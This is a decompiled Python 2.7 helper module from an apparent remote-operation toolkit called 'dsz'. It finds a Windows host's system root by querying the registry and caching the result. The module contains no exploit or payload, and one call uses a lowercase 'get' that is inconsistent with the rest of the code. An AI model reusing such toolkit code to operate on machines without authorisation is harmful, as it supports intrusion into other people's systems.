# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: __init__.py
import dsz
import dsz.version

def GetSystemPath():
    root, sys = GetSystemPaths()
    return '%s\\%s' % (root, sys)


def GetSystemPaths():
    local = ''
    if dsz.script.IsLocal():
        local = '_local'
    try:
        haveDirs = bool(dsz.env.Get('%s_sysDirsSet' % local))
        if haveDirs:
            return (
             dsz.env.Get('%s_sysDirRoot' % local), dsz.env.get('%s_sysDirSystem' % local))
    except:
        pass

    if dsz.version.checks.windows.Is9xFamily():
        key = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
        system = 'SYSTEM'
    else:
        key = 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'
        system = 'SYSTEM32'
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if not dsz.cmd.Run('registryquery -hive L -key "%s" -value SystemRoot' % key, dsz.RUN_FLAG_RECORD):
        raise RuntimeError, 'Registry query failed'
    root = dsz.cmd.data.Get('Key::Value::Value', dsz.TYPE_STRING)
    if dsz.env.Set('%s_sysDirRoot' % local, root[0]) and dsz.env.Set('%s_sysDirSystem' % local, system):
        dsz.env.Set('%s_sysDirsSet' % local, '1')
    return (
     root[0], system)